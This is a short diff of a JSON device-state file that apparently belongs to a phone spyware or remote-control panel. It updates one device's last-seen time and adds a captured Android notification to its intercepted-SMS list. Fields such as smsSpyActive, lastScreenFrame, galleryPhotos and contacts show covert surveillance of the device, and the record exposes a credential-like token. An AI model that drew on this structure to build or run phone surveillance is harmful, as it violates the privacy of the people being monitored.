@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777482058496,
+    "lastSeen": 1777482067499,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
@@ -18156,7 +18156,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "",
+        "content": "Messages is doing work in the background",
+        "time": "30/04 00:01",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777482068516
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
